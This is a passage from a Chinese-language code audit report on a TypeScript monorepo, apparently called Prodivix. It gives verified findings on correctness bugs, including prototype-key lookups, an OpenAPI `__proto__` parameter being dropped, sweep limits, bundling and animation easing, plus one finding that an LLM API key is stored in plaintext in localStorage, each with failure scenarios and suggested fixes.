**失败场景**: 一个 client zone 的 `core.http` 数据源,`baseUrl: 'https://fdic.gov'`(或任何标签以 `fc`/`fd` 开头的主机,例如 `fcbarcelona.com`、`fd-cdn.example.com`)编译时一切正常,但每一次运行时调用都会在发出任何请求之前立即以 `DATA_HTTP_CONFIGURATION_INVALID` 失败。该失败与真正的配置错误无法区分,而且该操作永远不可能成功。

**修复建议**: 只有在取值确实是 IPv6 字面量时才应用 IPv6 前缀规则——例如在去除方括号之前用 `hostname.startsWith('[')` 检测,或使用 `const isIpv6 = normalized.includes(':')`,并把 `fc`/`fd`/`fe8-b` 以及 `::`/`::ffff:` 的检查置于该标志之后。

**验证备注**: 证据与文件逐字一致(standaloneDataLiveRuntime.ts:611-617)。`privateHostname` 把 `normalized.startsWith('fc')`、`startsWith('fd')` 和 `/^fe[89ab]/u` 应用在原始 `URL.hostname` 上,没有任何 IPv6 字面量守卫,而下方的 IPv4 分支则正确地由四段数字检查把关。本仓库中的三个同类实现都具备编译器这份拷贝所缺少的守卫:packages/runtime-browser/src/browserNetworkAdapter.ts:64 计算 `const ipv6Literal = normalized.includes(':')` 并把 fc/fd/fe8-b 检查置于其后;packages/plugin-browser/src/gateway/network/gatewayNetworkPolicy.ts:105 把它们置于 `if (hostname.includes(':'))` 之内;apps/remote-runner-worker/install-proxy/entry.mjs:76 把它们置于 `if (family !== 6) return false` 之后。因此编译器这份拷贝是可证实的偏离,而非有意的策略。`privateHostname` 供 `httpEndpoint`(第 639 行)和 `protocolEndpoint`(第 822 行)使用,而它们是 client zone 的 core.http baseUrl 唯一可达的路径(第 1470/1495、1630、1773 行),并且不存在能更早捕获该问题的编译期 baseUrl 校验,因此 `https://fdic.gov` 或 `https://fda.gov` 会在运行时以 DATA_HTTP_CONFIGURATION_INVALID 失败关闭且永远不可能成功。属于失败关闭(不存在 SSRF 暴露),因此 medium 而非 high 才是站得住脚的严重级别。

##### M-C-13 Element 宿主解析穿透到 Object.prototype,绕过失败关闭的解析器守卫并使渲染器崩溃

- **位置**: [`packages/pir-react-renderer/src/host/pirRendererHost.ts:124`](packages/pir-react-renderer/src/host/pirRendererHost.ts#L124)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-pir`

**详情**: `elementsByType` 是一个裸对象字面量(第 113 行),被当作以作者可控的 `node.type` 为键的字典使用。对于任何命名了 `Object.prototype` 成员的 `node.type`(`constructor`、`toString`、`valueOf`、`hasOwnProperty`、`isPrototypeOf`、`propertyIsEnumerable`、`toLocaleString`、`__proto__`),`elementsByType[node.type]` 会返回继承来的值,于是 `resolved` 为真值,`host.resolveElement(...)` 从不被调用,`elementResolverMissing` 阻塞性 issue 也从不发出 —— 这破坏了该模块声明的契约("Resolves every Element through an explicit host before React runs")。同样缺少守卫的查找在渲染期再次出现于 `PIRElementProjection.tsx:94`(`const hostEntry = host.elementsByType[node.type]`),此时 `hostEntry.component` 为 `undefined`。`missingElementTypes` 正确地使用了 `Set`,`selectPirSlotProjection` 也正确地使用了 `Object.hasOwn`,因此这是一处孤立的遗漏,而非设计选择。

**失败场景**: 导入(或由 AI/插件作者产出)一个包含 `{ id: 'n1', kind: 'element', type: 'constructor' }` 的 PIR 页面。它能通过 `decodePirDocument`、`validatePirDocument` 和 `decodeWorkspacePirDocument`(没有任何检查器约束 `node.type`)。`resolvePirRendererHost` 返回 `status: 'ready'` 且零 issue,而不是 `PIR_RENDER_ELEMENT_RESOLVER_MISSING`。渲染时,`hostEntry = Object`(构造函数本身),`hostEntry.project` 为 undefined,`Component = hostEntry.component` 为 `undefined`,`<Component {...props}>` 抛出 React 未捕获的 "Element type is invalid: expected a string or a class/function but got: undefined",整个 Blueprint 画布 / 预览子树被卸载,且没有任何按节点的错误隔离。

**修复建议**: 在两处都改用无原型的存储或自有属性守卫:`const elementsByType = Object.create(null)`(或改用 `Map`),并在 `PIRElementProjection` 中通过 `Object.hasOwn(host.elementsByType, node.type) ? host.elementsByType[node.type] : undefined` 读取。保留 `if (!hostEntry) return null` 的失败关闭路径,使未解析的类型仍以 `elementResolverMissing` 的形式暴露出来。

**验证备注**: 证据逐字节吻合。`elementsByType` 是一个裸 `{}`(pirRendererHost.ts:113),:124-125 处的查找没有任何自有属性守卫;grep 显示 packages/pir 与 packages/pir-react-renderer 中任何位置都没有 `Object.create(null)`,而 :167 返回的冻结对象仍保留 Object.prototype。当 `node.type === 'constructor'` 时,查找得到 `Object` 函数,`resolved` 为真值,`host.resolveElement` 从不被调用,`elementResolverMissing` 也从不被推入,因此返回 `status: 'ready'` —— 该模块在 :108 处写明的失败关闭契约被破坏。上游没有任何东西约束这个字符串:`checkElementNode`(pirCodec.ts:876)只做了 `checkString(object.type)`,pirValidator.ts 和 pirBindingValidator.ts 也都没有限制 element 类型。PIRRenderer.tsx:141 把该 host 交给运行时,PIRElementProjection.tsx:94 重复了这次无守卫的读取,于是 `Component = hostEntry.component` 为 `undefined`,React 抛出异常;我确认 apps/web/src 与 packages 中任何位置都不存在 `ErrorBoundary`/`componentDidCatch`/`getDerivedStateFromError`,因此该异常确实会卸载整棵树。唯一需要修正的是严重性:通过产品自身基于面板驱动的创作路径无法触达此问题(apps/web 的 resolveElement 由一个以 Map 支撑、类型固定为 HTML/Pdx 的注册表供给)—— 它需要一个导入的、AI 创作的、插件产出的或手工损坏的文档。影响属于可用性/健壮性(崩溃而非阻塞性 issue),而非数据损坏或权限边界,因此是 medium 而不是 high。

##### M-C-14 区域恢复的 Terminal 撤销永远无法清理超过 100 条 Terminal sweep 上限的批次,因此大规模故障转移总是失败关闭

- **位置**: [`packages/runtime-remote/src/remoteExecutionRegionalRecoveryOperator.ts:502`](packages/runtime-remote/src/remoteExecutionRegionalRecoveryOperator.ts#L502)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-remote`

**详情**: `revokeTerminals` 会关闭批次中的每一个目标 Terminal 会话(每次关闭都通过 `recordExpiry` 把持久化行的 `expiresAt` 置为 0),随后仅调用一次 `broker.sweepExpired()`,最后重新捕获每个执行并要求 `revoked.terminal === undefined`(即 `remote_execution_terminal_sessions` 行必须已消失)。复制型 broker 的 `sweepExpired` 最多删除 `maximumSweepRecords` 行:`REMOTE_EXECUTION_TERMINAL_STATE_LIMITS.maximumSweepRecords` 是 100,而 `replicatedRemoteExecutionTerminalBrokerSupport.ts:124-129` 中的 `boundedPositiveInteger(..., 100)` 将其硬性限制在 100(更大的值会抛异常)。该 operator 的 `maximumBatchSize` 是 128(默认值同时也是硬上限,`remoteExecutionRegionalRecoveryOperator.types.ts:9`)。因此一次 sweep 最多删除 100 行,而可能需要多达 128 次撤销。当有无关的、已过期的 Terminal 行占据这 100 行的 sweep 窗口时(它们都排在最前面,因为已关闭的行 `expires_at = 0`),更小的批次同样会踩中这一缺口。

**失败场景**: 对 110 个执行做 source-unavailable 故障转移,每个执行在目标区域都有一个活跃的 Terminal 会话。`revokeTerminals` 调用 `closeExecution` 110 次(全部成功,每行的 `expires_at` 变为 0),随后单次 `sweepExpired()` 只删除前 100 行。剩余 10 个执行重新捕获时仍返回 `terminal !== undefined`,于是 `verifyRevokedCheckpoint` 为 false,operator 在 `trafficAuthority.cutover` 的 `prepare` 回调中抛出 `terminal-revocation-failed`。Postgres 的 cutover 事务回滚,流量 epoch 从未推进,而一次性签名授权 grant 已被 `options.authorization.consume` 消耗(记录在 `remote_execution_regional_operator_grants` 中)—— 灾难恢复的 cutover 中止,必须重新签发 grant 才能重试。

**修复建议**: 循环调用 `sweepExpired()`,直到每个已撤销执行的 Terminal 行都消失(或直到它报告扫除 0 行),或者在状态存储上增加一个按执行作用域的直接撤销/删除操作,而不依赖全局过期 sweep。至少应在 operator 构造时断言 broker 的 sweep 预算 >= `maximumBatchSize`。

**验证备注**: 引用的证据与 remoteExecutionRegionalRecoveryOperator.ts:492-521 完全吻合。已核实整条链路:(a) replicatedRemoteExecutionTerminalBroker.closeExecution 只重写该行(closeStored 把 accessTokenExpiresAt 置为 0;对任何非 'client-closed' 原因,recordExpiry 都返回 accessTokenExpiresAt,因此 expires_at 变为 0)—— 它从不删除;(b) sweepExpired 调用一次 stateStore.listExpired(now(), maximumSweepRecords),最多删除这么多行;maximumSweepRecords 在 replicatedRemoteExecutionTerminalBrokerSupport.ts:124-129 中被 boundedPositiveInteger(..., REMOTE_EXECUTION_TERMINAL_STATE_LIMITS.maximumSweepRecords=100) 钳制,而 postgresTerminalStateStore.listExpired 还会额外拒绝任何 > 100 的 limit,并以 ORDER BY expires_at ASC 应用 LIMIT $2(因此 expires_at=0 的行排在最前);(c) 该 operator 的 maximumBatchSize 是 128(types.ts:9 的硬上限,且生产任务传入的 REMOTE_DR_MAXIMUM_BATCH_SIZE 默认值/最大值均为 128);(d) sourceUnavailableOutcome 会对每个 target.terminal !== undefined 的执行设置 revokeTerminal,因此全部 128 个都可能需要撤销;(e) verifyRevokedCheckpoint 要求 revoked.terminal === undefined,而生产探针(postgresRegionalRecovery.ts:256-283)纯粹依据 remote_execution_terminal_sessions 行是否存在来推导 terminal,与是否已关闭无关。因此单批次中超过 100 次撤销必然会遗留行,verifyRevokedCheckpoint 失败,'terminal-revocation-failed' 在 trafficAuthority.cutover 的 prepare 内部中止,而此时 authorization.consume 已经烧掉了一次性 grant(regionalRecoverySignedProof.ts:386 grantReplayStore.consume)。sweepExpired 的返回计数被忽略,且只被调用一次,从未在循环中调用。没有测试覆盖 >100 的情况(operator.test.ts 把 sweepExpired 打桩为返回 0)。严重性由 high 下调为 medium:该失败是失败关闭的(无损坏、无安全影响),可通过拆分批次并重新签发 grant 恢复,且需要单批次超过 100 个执行且每个都带有活跃 Terminal 行 —— 审查者所说的"大规模故障转移总是失败关闭"有所夸大,因为多数故障转移执行并没有附带交互式终端。

##### M-C-15 OpenAPI 导入器静默丢弃任何名为 **proto** 的参数,却仍返回 'ready' 提案

- **位置**: [`packages/data-http/src/dataOpenApiImporter.ts:1194`](packages/data-http/src/dataOpenApiImporter.ts#L1194)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: `inputProperties` 和 `parameterMappings[location]` 都是用裸方括号赋值写入的普通对象字面量。当某个 OpenAPI 参数名为 `__proto__` 时,`inputProperties['__proto__'] = <frozen schema object>` 会触发 `Object.prototype.__proto__` 的 setter,重新指向该对象的原型,而不是创建自有键;`parameterMappings.query['__proto__'] = '/…'` 则是一次静默的空操作(字符串值)。没有追加任何 issue,因此 `createDataOpenApiImportProposal` 仍返回 `status: 'ready'`。如果该操作还有其他参数,破坏会更严重:`properties: inputProperties` 此时拥有非 Object.prototype 的原型,于是 `convertSchemaNode` 的 `isPlainRecord` 检查失败,生成的 schema 变成 `properties: true`,而 `normalizeDataSourceDocument` 会以笼统的 'does not satisfy the canonical Data source contract' 消息拒绝它。本分区中其他所有 JSON 对象构建器(如 `cloneBoundedJson` 第 304 行、`operationManagedProjection` 第 418 行)都使用 `Object.fromEntries`,不受影响。

**失败场景**: 导入一份 OpenAPI 3.1 规范,其 GET /items 操作声明了一个查询参数 `{"name":"__proto__","in":"query","required":true,"schema":{"type":"string"}}`。`Object.keys(inputProperties).length` 为 0,因此不会创建输入 schema;`compactMappings` 为 `{}`,因此不会发出 `parameterMappings` 配置。提案以 `status:'ready'` 且零 issue 返回,被采纳的 canonical 操作静默丢失了一个必填查询参数 —— 运行时 HTTP 适配器调用该端点时将完全不带 `__proto__` 查询值。若再加上第二个普通参数 `id`,整个导入则会以 'invalid' 失败,而错误消息不会指明任何参数。

**修复建议**: 把 `inputProperties` 和每个 `parameterMappings[location]` 构建为 `[key, value]` 条目数组,再用 `Object.fromEntries` 物化;或者以显式的 `unsupportedShape` issue 拒绝/规范化与 `__proto__` 冲突的参数名,使导入以精确的诊断失败关闭。

**验证备注**: 已在 packages/data-http 中用一次性 vitest 实证复现。证据引用与第 1194-1202 行原样吻合。`inputProperties` 是裸 `{}` 字面量(第 1172 行),`parameterMappings.{path,query,header}` 也是裸 `{}` 字面量(1174-1178);`canonical()`(第 162 行)只拒绝空串/未去空白/含 NUL 的字符串,因此名为 `__proto__` 的参数能通过 parseParameters。用例 A(单个名为 `__proto__` 的查询参数):proposal.status === 'ready',issues === [],发出的操作没有 inputSchemaId,也没有 parameterMappings —— 必填参数被静默丢失。用例 B(`__proto__` 加一个普通的 `id` 参数):status 为 'invalid',只有一条笼统 issue {code:DATA_OPENAPI_INVALID_DOCUMENT, path:'/@proposal', message:'Imported OpenAPI projection does not satisfy the canonical Data source contract.'},未指明任何参数 —— 原因是 convertSchemaNode 第 463 行 `if (!isPlainRecord(current)) return true;`,因为 isPlainRecord(第 143 行)要求 getPrototypeOf === Object.prototype。用例 C 的基线是 'ready' 且 schema+mappings 正确,因此差异完全来自 `__proto__` 这个名字。该导入器可通过 apps/web/src/editor/features/resources/dataOpenApiImportSession.ts:106 在生产中到达。严重性由 high 修正为 medium:这是生产导入路径上真实的静默数据丢失,但不存在全局原型污染(只有一个局部临时对象的 [[Prototype]] 被重指),且触发条件要求 OpenAPI 规范中存在字面名为 `__proto__` 的参数。

##### M-C-16 HTTP 适配器以 operation 级字段名读取 source 级的 apiKeyHeader 环境绑定,导致 lease 拒绝该绑定

- **位置**: [`packages/data-http/src/dataHttpAdapter.ts:627`](packages/data-http/src/dataHttpAdapter.ts#L627)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: `resolveDataOperationEnvironment` 为每个非字面量配置项声明一个绑定请求,字段为 `field: `${owner}.${key}``(`packages/data/src/dataEnvironmentRuntime.ts:66`),而 `ExecutionEnvironmentResolutionLease.readPublicBinding` 要求 `field` 精确匹配,否则抛出 `bindingMissing`(`packages/runtime-core/src/executionEnvironmentResolution.ts:525-534`)。适配器对 `authorization`(第 605-607 行)和 `apiKey`(第 708-710 行)都正确地推导了依赖 owner 的字段名,但 `apiKeyHeader` 回退到 `source.configurationByKey.apiKeyHeader`,却始终传入硬编码的字段 `'operation.apiKeyHeader'`。

**失败场景**: 创建一个 data source,其 source 级 `apiKey` 为 secret-ref,source 级 `apiKeyHeader` 绑定为 `{ kind: 'environment-ref', reference: { bindingId: 'apiKeyHeaderName' } }`,且没有 operation 级覆盖。`bindingRequests` 发出 `{ bindingId:'apiKeyHeaderName', kind:'public', field:'source.apiKeyHeader' }`,但适配器调用的是 `environment.readPublicBinding({bindingId:'apiKeyHeaderName'}, 'operation.apiKeyHeader')`,于是 `requestedBinding` 找不到匹配并抛出 `ExecutionEnvironmentResolutionError(bindingMissing)`。该操作的每一次调用都会失败,而错误指向的是环境层,而不是被错误标注的字段。

**修复建议**: 完全按照 `authorization`/`apiKey` 的做法从 owner 推导字段名:`operation.configurationByKey.apiKeyHeader ? 'operation.apiKeyHeader' : 'source.apiKeyHeader'`。

**验证备注**: 证据与 dataHttpAdapter.ts:622-630 原样吻合。已核实两侧的契约:dataEnvironmentRuntime.ts:66 为每个非字面量配置项构造 `field: `${owner}.${key}``,而 executionEnvironmentResolution.ts 的 requestedBinding()/readPublicBinding 要求 bindingId+kind+field 精确匹配,否则抛出 EXECUTION_ENVIRONMENT_RESOLUTION_ERROR_CODES.bindingMissing。literalString(第 66-84 行)对 `environment-ref` 值会把传入的 `field` 直接转发给 readPublicBinding。其他每个调用点传入的字段都与其唯一 owner 匹配(source.baseUrl、operation.method、operation.path、operation.emptyWhen、operation.responseBodyPath),同族的 secret 也正确推导了 owner:第 604-606 行的 `authorizationField` 以及第 707-711 行的 `operation.apiKey`/`source.apiKey`。只有 apiKeyHeader 回退到 source.configurationByKey 却硬编码了 'operation.apiKeyHeader'。可达性已确认:dataRuntime.ts:704-712 解析 lease 并在第 774 行传给 adapter.invoke;dataDocument.ts 中没有任何东西把 apiKeyHeader 限制为字面量或限制在 operation 作用域;而 apps/backend/internal/modules/remoteexecution/data_gateway.go:510-517 明确实现了 source 级 apiKeyHeader 回退(其 `field` 参数仅用于错误消息,因此 Go 路径可正常工作),这证明 source 级回退是一种既定且受支持的配置,而 TS 适配器破坏了它。严重性保持 medium:一种受支持的非恶意配置永久不可用,并且报错来自错误的层。

##### M-C-17 当模块以同名同时导出值和类型时,TypeScript 导出符号发生碰撞,静默丢弃其中一个声明

- **位置**: [`packages/code-language/src/typescriptSemanticContribution.ts:40`](packages/code-language/src/typescriptSemanticContribution.ts#L40)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-authoring-lang`

**详情**: `createCodeExportLocalSymbolId` 纯粹依据导出*名称*推导符号标识(`export:${exportName}`),而 `addExport` 把它转成 `globalSymbolId = createCodeSymbolId(workspaceId, artifactId, 'export:<name>')`。TypeScript 有两个相互独立的声明空间,因此同一模块中的 `export type Foo` 和 `export const Foo` 都会被收集(前者经第 139-161 行的 `isTypeAliasDeclaration/isInterfaceDeclaration` 分支,后者经第 120-137 行的 `isVariableStatement` 分支),并产生*相同的* globalSymbolId。第 451-458 行的 `uniqueById` 构造 `new Map(values.map(v => [v.id, v]))`,因此后插入的声明会静默覆盖先前那个;顺序按 `start` 偏移排序(第 196-203 行),即文件中位置靠后的声明胜出。存活下来的 WorkspaceSymbol 只携带该声明的 `kind`、`sourceSpan` 和 `typeRef`。

**失败场景**: artifact `/src/config.ts` 第 1 行是 `export const Config = { a: 1 };`,第 3 行是 `export type Config = { a: number };`(非常常见的 TS 伴生对象模式)。只有一个关于 `Config` 的 `code-symbol` 进入 Semantic Index,其 `kind: 'code-type'`、`typeRef: 'code-export:code-type'`,`sourceSpan` 位于第 3 行。已持久化的 PIR `call-code` 触发器 `{ artifactId: 'config', exportName: 'Config' }`(`createCodeReferenceSemanticTarget` 按名称针对 kinds `['code-export','code-function','code-type']` 解析)现在会解析到那个*类型*声明:从 Inspector 执行转到定义会跳到类型别名而非值;`analyzeCodeLanguageRenameImpact` 会拿重命名编辑与类型别名的区间比较,于是把值 `Config` 重命名为 `Send` 时不会产生任何重叠编辑,`affectedBindings` 保持为空,`applyCodeLanguageRename` 照常执行,而已持久化的绑定 `exportName: 'Config'` 被留下,指向一个不再是可调用导出的符号。

**修复建议**: 把声明空间纳入本地符号 id(例如根据 `input.kind` 区分 `export:value:<name>` 与 `export:type:<name>`),或者在 `collectExports` 中检测重复的 `globalSymbolId` 并用声明的起始偏移消歧,而不是任由 `uniqueById` 丢掉一个声明。把两个不同的声明合并到同一标识之下绝不应当是静默的。

**验证备注**: 已在源码中端到端核实。`createCodeExportLocalSymbolId`(typescriptSemanticContribution.ts:40-41)仅依据导出名称推导 id,`addExport`(第 87-98 行)把它转成 `createCodeSymbolId(workspaceId, artifactId, 'export:<name>')`。`collectExports` 通过 `isVariableStatement` 分支收集 `export const Config`(第 120-137 行,kind 为 'code-export'),通过声明分支收集 `export type Config`(第 139-161 行,kind 由 `declarationKind` 得到 'code-type')—— 二者是合法的 TS 声明空间伴生体,却产生完全相同的 globalSymbolId。`uniqueById`(第 451-458 行)是 `new Map(values.map(v => [v.id, v]))`,因此后插入者胜出;符号按 `exports` 顺序推入,并按 artifactId、exportName、再按 `start` 排序(第 196-203 行),因此文件中靠后的声明存活,且只带有它自己的 kind/sourceSpan/typeRef。我还核查了审查者主张的两处后果升级,二者均成立:(a) `createCodeReferenceSemanticTarget`(packages/authoring/src/semantic/codeReferenceSemantic.ts:30-39)构造的是按名称的目标,`symbolKinds = ['code-export','code-function','code-type']` 且限定在该 artifact 内,而 PIR `call-code` fact 未设置 `expectedTypeRefs`/`requiredCapabilityIds`(packages/pir/src/authoring/pirSemanticBindingFacts.ts:312-328),同时两个 TS 导出符号都带有 `stability: 'durable'`,因此 semanticResolution.ts:81-91 中的 `isCompatibleSymbol` 会接受该类型别名,引用解析到它;(b) `analyzeCodeLanguageRenameImpact` 随后通过 `sourceSpansOverlap` 把 TS 重命名编辑(只覆盖值声明)与类型别名的 `sourceSpan` 比较,未发现重叠,返回 `affectedBindings: []`,而 CodeAuthoringWorkspace.tsx:1308-1317 直接应用了重命名。值得注意的是,这次碰撞还*抑制*了一个失败关闭状态:如果 id 不同,`resolveReferenceFact`(semanticResolution.ts:224-226)会返回 `ambiguous` 并发出 SEM-2003;去重把它静默转成了一个自信而错误的解析结果。没有任何守卫拦截 —— 由于 `uniqueById` 先执行,不会有重复 id 拒绝逻辑抵达索引。medium 是站得住脚的:既有持久化后果(一个已持久化的 PIR 绑定指向不再可调用的导出),又有错误的转到定义。

##### M-C-18 @radix-ui/react-select 未从 @prodivix/ui 产物中外部化,导致 Radix 的模块级 layer 状态被重复

- **位置**: [`packages/ui/vite.config.ts:9`](packages/ui/vite.config.ts#L9)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-official-ui`

**详情**: `externalPackages` 列出了 `@radix-ui/react-dialog`、`@radix-ui/react-popover` 和 `@radix-ui/react-tooltip`,却漏掉了 `@radix-ui/react-select`,尽管 `PdxSelect.tsx:2` 导入了它,`packages/ui/package.json:59` 也把它声明为运行时 `dependency`。因此 Rollup 会把 react-select 及其约 20 个传递性 `@radix-ui/*` 包(包括 `react-dismissable-layer`、`react-portal`、`react-focus-scope`、`react-presence`)内联进 `dist`,而那三个已外部化的包则从使用方的 `node_modules` 解析同样的原语。`@radix-ui/react-dismissable-layer` 保有模块级单例(`var originalBodyPointerEvents`、`context.layers`、`context.layersWithOutsidePointerEventsDisabled`),因此两份实例意味着两套彼此独立、互不协调的 layer 栈。这会影响已发布包的每一个使用方,包括编译器导出的应用(`packages/prodivix-compiler/src/export/packageOriginResolver.ts:31` 把 `@prodivix/ui` 声明为导出依赖)。

**失败场景**: 导出的应用在一个打开的 `PdxModal` 内渲染一个 `PdxSelect`。dialog 那份 react-dismissable-layer 把 `document.body.style.pointerEvents` 设为 `'none'` 并快照 `originalBodyPointerEvents = ''`;随后被打包进来的 select 那份则快照 `originalBodyPointerEvents = 'none'`。用户选中一个选项后应用关闭该模态框,两个 layer 在同一次提交中卸载。如果 select 那份的清理逻辑最后运行,它会恢复为 `'none'`,使 `document.body.style.pointerEvents === 'none'` 永久保持 —— 整个页面都无法点击。两套栈还会破坏嵌套 layer 的抑制机制,于是在 portal 化的 Select 下拉中按下指针会被 dialog layer 判定为"外部",从而关闭模态框。

**修复建议**: 把 `'@radix-ui/react-select'` 加入 `externalPackages`,使其与其他三个 Radix 运行时依赖一视同仁。可考虑从 `package.json` 的 `dependencies` + `peerDependencies` 推导外部化列表,而不是手工维护数组,这样新增的运行时依赖就永远不会被静默内联。

**验证备注**: 已在构建产物中实证核实,而不仅仅是阅读配置。vite.config.ts:5-17 的 externalPackages 包含 react-dialog/react-popover/react-tooltip,但不含 @radix-ui/react-select;package.json:59 把 `"@radix-ui/react-select": "2.3.4"` 声明为运行时依赖,PdxSelect.tsx:2 导入了它。`ls packages/ui/dist/node_modules/.pnpm/` 证明内联确实发生:发布的 dist 中包含 @radix-ui_react-select、@radix-ui_react-dismissable-layer、@radix-ui_react-portal、@radix-ui_react-focus-scope、@radix-ui_react-presence、react-remove-scroll 和 react-style-singleton 的打包副本,而 dialog/popover/tooltip 不存在(已外部化)。对打包进来的 dismissable-layer 做 grep(dist/node_modules/.pnpm/@radix-ui_react-dismissable_.../dist/index.js:14,44-45)确认了模块级单例:`layersWithOutsidePointerEventsDisabled: new Set()` 以及持有 body pointerEvents 快照的压缩变量 `f`,清理逻辑为 `size === 0 && (E.body.style.pointerEvents = f)` —— 因此两份模块实例给出两套独立的快照与栈,与描述完全一致。@radix-ui/react-select 2.3.4 把 @radix-ui/react-dismissable-layer 1.1.16 声明为依赖,其 dist 使用了 disableOutsidePointerEvents。严重性由 high 修正为 medium:apps/web 不受影响,因为 apps/web/config/resolveAliases.ts 把 '@prodivix/ui' 别名指向 packages/ui/src,编辑器从不加载 dist;影响仅限于已发布包的外部使用方以及编译器导出的应用,需要 Select 嵌套在 Modal 内这一特定交互,且属于体验劣化(页面不可点击 / 误关闭)而非数据损坏。

##### M-C-19 反向动画迭代在方向反转之前应用缓动函数,与 CSS/Web Animations 语义不一致

- **位置**: [`packages/animation/src/animationEvaluation.ts:197`](packages/animation/src/animationEvaluation.ts#L197)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-domain-misc`

**详情**: Web Animations / CSS Animations 先计算有向进度(反向或奇数次 alternate 迭代取 `1 - p`),之后才应用缓动函数:`cursor = D * f(1 - p)`。而 `resolveTimelineCursorMs` 却是先对未反转的进度应用缓动,再把结果镜像:`cursor = D - D * f(p) = D * (1 - f(p))`。两者只在 `f` 为线性或完全点对称(例如 `ease-in-out`)时才一致;对于非对称的 CSS 预设 `ease`、`ease-in`、`ease-out` 以及任意 `cubic-bezier(...)`,除端点外处处不同。整个 timeline 模型是 CSS 的直接映射(`direction: 'alternate-reverse'`、`fillMode`、`cubic-bezier`、`ease-in-out`),而 specs/decisions/43.animation-runtime-and-execution-session.md 规定播放必须执行 canonical 方向加 timeline 缓动,因此预览/播放会静默产生一条与作者编写的 CSS 命名缓动所隐含的曲线不同的曲线。packages/animation/src/animation.property.test.ts:180 处的属性测试只覆盖了不带 timeline 缓动的方向组合,因此这一点没有被覆盖。

**失败场景**: timeline `{durationMs: 1000, easing: 'ease-in', direction: 'reverse', iterations: 'infinite'}`,在 `globalMs = 250` 时:`p = 0.25`;ease-in 即 `cubic-bezier(0.42,0,1,1)`,所以 `f(0.25) ≈ 0.0935`、`f(0.75) ≈ 0.622`。代码返回 `1000 - 93.5 = 906.5` ms;而 CSS/WAAPI 会把 cursor 置于 `1000 * f(0.75) ≈ 622` ms。因此在该时刻通过 `applyTimeline` 采样得到的每一个关键帧值都会偏差约 28% 的时间轴长度。`direction: 'alternate'` 配 `easing: 'ease'`(即 CSS 默认形状的曲线)的每一次奇数迭代也会出现同样的偏离,导致来回两趟不再互为镜像。

**修复建议**: 先反转,再缓动:`const p = clamp01(loopMs / durationMs); const directed = isReversedIteration(timeline.direction, iterationIndex) ? 1 - p : p; return (!easing || easing === 'linear' ? directed : resolveEasing(easing)(directed)) * durationMs;`

**验证备注**: 证据与 animationEvaluation.ts:193-199 完全一致。代码先计算 easedLoopMs = f(p)*D,然后对反向迭代返回 D - f(p)*D,即 D*(1-f(p));而 Web Animations/CSS 是先算有向进度再套缓动函数,即 D*f(1-p)。我用该包自带的 cubicBezier 核对了数值:ease-in = cubic-bezier(0.42,0,1,1),f(0.25) ~ 0.0932、f(0.75) ~ 0.623,因此在 globalMs=250 且 direction 为 'reverse' 时,代码得出 ~906.8ms,而 WAAPI 得出 ~623ms。这不是纯理论上的镜像差异:packages/prodivix-compiler/src/animation/compileAnimation.ts:216-222 和 :300-325 把同一条 timeline 输出为 `element.animate(..., { direction: Timing.direction, easing: Timing.easing })`,即真正的 WAAPI,而编辑器的预览/播放路径(apps/web/.../animationExecutionClient.ts -> createAnimationExecutionProvider -> startAnimationPlayback -> resolveTimelineCursorMs,以及 evaluateAnimationFrame)使用的是偏离的公式。因此对于 reverse/alternate 与任何非对称缓动的组合,编写时的预览与导出的生产结果确实不一致。覆盖缺口也是真实的:animation.property.test.ts:180-210 构造的 timeline 没有 `easing` 字段,因此只断言了线性情形。影响仅限视觉/时间维度 —— 没有 Workspace 或数据损坏 —— 所以 medium 成立。

#### 4.3.2 安全(security)

##### M-SEC-01 LLM 供应商的 API key 以明文持久化到浏览器 localStorage

- **位置**: [`apps/web/src/ai/aiSettingsStore.ts:21`](apps/web/src/ai/aiSettingsStore.ts#L21)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: `useAiSettingsStore` 用基于 `localStorage` 的 zustand `persist` 包裹了整个 `ProdivixAiSettings` 对象,且没有 `partialize`。`ProdivixAiSettings`(packages/ai/src/settings/aiSettings.ts:13)为 `openai-compatible` 供应商包含一个可选的 `apiKey`,`BlueprintAssistantSettingsModal` 会把它写到那里(第 75 行的 `toSettings` → 第 176 行的 `setSettings(toSettings(draft))`)。因此该 secret 会以键 `prodivix-ai-settings` 被写入持久化的浏览器存储,同源下的任何脚本或扩展都能读取,而且它从不会被清除:`useAuthStore.clearSession()`(apps/web/src/auth/useAuthStore.ts:42)只操作 auth store。这直接违反了「secret 值绝不能在授权的、短时效的、callback 绑定的服务端传输之外到达浏览器」这一不变量。

**失败场景**: 用户打开 Blueprint Assistant 设置,选择 `openai-compatible` 供应商,粘贴 `sk-...` 并点击保存。此时 `localStorage['prodivix-ai-settings']` 以明文包含 `{"state":{"settings":{"provider":"openai-compatible","apiKey":"sk-..."}}}`。它在登出和浏览器重启后依然存在,可被同源下的任何 XSS 或恶意浏览器扩展外泄;在共享机器上,使用同一浏览器 profile 的下一位用户会直接继承该 key。

**修复建议**: 不要把 API key 放进任何持久化的客户端 store。要么只在内存中保存本次会话使用,要么把供应商凭据移到由后端代理持有 key。如果短期内不可避免要使用持久化 store,则添加 `partialize` 在序列化前剥离 `apiKey`,并在每个会话重新提示输入。

